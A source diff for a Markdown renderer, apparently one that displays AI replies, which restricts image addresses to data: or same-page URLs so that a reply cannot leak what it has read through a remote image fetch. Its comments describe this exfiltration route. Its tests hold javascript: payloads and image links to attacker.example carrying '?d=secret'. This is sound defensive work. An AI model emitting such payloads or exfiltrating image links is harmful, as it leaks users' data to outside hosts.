@@ -247,18 +247,12 @@ const Markdown = struct {
         return false;
     }
 
-    const Attribute = enum {
-        text,
-        link,
-        image,
-    };
-
     fn writeAttribute(self: *Markdown, attribute: *const md.c.MD_ATTRIBUTE, kind: Attribute) bool {
         var value: std.ArrayList(u8) = .empty;
         defer value.deinit(self.gpa);
         self.decodeAttribute(attribute, &value) catch return self.fail();
 
-        if (kind != .text and !safeAddress(value.items, kind == .link)) return self.put("#");
+        if (kind != .text and !safeAddress(value.items, kind)) return self.put("#");
         return self.putEscaped(value.items);
     }
 
@@ -280,15 +274,27 @@ const Markdown = struct {
 const heading_open = [_][]const u8{ "<h1>", "<h2>", "<h3>", "<h4>", "<h5>", "<h6>" };
 const heading_close = [_][]const u8{ "</h1>\n", "</h2>\n", "</h3>\n", "</h4>\n", "</h5>\n", "</h6>\n" };
 
-fn safeAddress(url: []const u8, is_link: bool) bool {
+/// What an attribute of the page carries: text billy writes, a link, or an image the page fetches.
+const Attribute = enum { text, link, image };
+
+/// Whether an attribute may carry `url`. An image is the one a page fetches as it draws, so it may
+/// only be a data: picture or one this page serves: anything else is a request the user never sees,
+/// which is how a reply sends what it has just read to a host of its own.
+fn safeAddress(url: []const u8, kind: Attribute) bool {
     var buffer: [16]u8 = undefined;
     const scheme = schemeOf(url, &buffer);
-    const refused: []const []const u8 = if (is_link)
-        &.{ "javascript:", "vbscript:", "data:" }
-    else
-        &.{ "javascript:", "vbscript:" };
-    for (refused) |bad| {
-        if (std.mem.eql(u8, scheme, bad)) return false;
+
+    if (kind == .image) {
+        if (std.mem.eql(u8, scheme, "data:")) return true;
+        // A name with no scheme is this page's own, unless it names another host in disguise.
+        if (std.mem.endsWith(u8, scheme, ":")) return false;
+        var at: usize = 0;
+        while (at < url.len and (url[at] <= ' ' or url[at] == 0x7f)) at += 1;
+        return !std.mem.startsWith(u8, url[at..], "//");
+    }
+
+    for ([_][]const u8{ "javascript:", "vbscript:", "data:" }) |refused| {
+        if (std.mem.eql(u8, scheme, refused)) return false;
     }
     return true;
 }
@@ -485,21 +491,21 @@ test "a link is written with an escaped address, and a dangerous one is not foll
 }
 
 test "a scheme that could run code is refused however it is spelled" {
-    try std.testing.expect(!safeAddress("javascript:alert(1)", true));
-    try std.testing.expect(!safeAddress(" javascript:alert(1)", true));
-    try std.testing.expect(!safeAddress("java\tscript:alert(1)", true));
-    try std.testing.expect(!safeAddress("JavaScript:alert(1)", true));
-    try std.testing.expect(!safeAddress("vbscript:x", true));
+    try std.testing.expect(!safeAddress("javascript:alert(1)", .link));
+    try std.testing.expect(!safeAddress(" javascript:alert(1)", .link));
+    try std.testing.expect(!safeAddress("java\tscript:alert(1)", .link));
+    try std.testing.expect(!safeAddress("JavaScript:alert(1)", .link));
+    try std.testing.expect(!safeAddress("vbscript:x", .link));
 
-    try std.testing.expect(!safeAddress("data:text/html,x", true));
-    try std.testing.expect(!safeAddress("data:image/png;base64,x", true));
-    try std.testing.expect(safeAddress("data:image/png;base64,x", false));
+    try std.testing.expect(!safeAddress("data:text/html,x", .link));
+    try std.testing.expect(!safeAddress("data:image/png;base64,x", .link));
+    try std.testing.expect(safeAddress("data:image/png;base64,x", .image));
 
-    try std.testing.expect(safeAddress("https://example.com", true));
-    try std.testing.expect(safeAddress("mailto:a@b.c", true));
-    try std.testing.expect(safeAddress("/docs", true));
-    try std.testing.expect(safeAddress("#top", true));
-    try std.testing.expect(safeAddress("relative/path", true));
+    try std.testing.expect(safeAddress("https://example.com", .link));
+    try std.testing.expect(safeAddress("mailto:a@b.c", .link));
+    try std.testing.expect(safeAddress("/docs", .link));
+    try std.testing.expect(safeAddress("#top", .link));
+    try std.testing.expect(safeAddress("relative/path", .link));
 }
 
 test "a scheme spelled with entities is caught" {
@@ -513,6 +519,18 @@ test "an image may be a data: image, but a link may not" {
         "![b](data:image/png;base64,AAAA)\n",
     );
     try expectMarkdown("<p><img src=\"#\" alt=\"a\"></p>\n", "![a](javascript:x)\n");
+}
+
+test "an image from another host is not drawn" {
+    // A picture is fetched as the page draws it, so one a reply chose is a request the user never
+    // sees, carrying whatever the reply had just read.
+    try expectMarkdown("<p><img src=\"#\" alt=\"a\"></p>\n", "![a](https://attacker.example/p.png?d=secret)\n");
+    try expectMarkdown("<p><img src=\"#\" alt=\"a\"></p>\n", "![a](//attacker.example/p.png)\n");
+    try expectMarkdown("<p><img src=\"#\" alt=\"a\"></p>\n", "![a]( //attacker.example/p.png)\n");
+
+    // One this page serves is drawn, which is what a reply that drew a diagram here means.
+    try expectMarkdown("<p><img src=\"/p.png\" alt=\"a\"></p>\n", "![a](/p.png)\n");
+    try expectMarkdown("<p><img src=\"p.png\" alt=\"a\"></p>\n", "![a](p.png)\n");
 }
 
 test "a reply cannot forge an address attribute" {
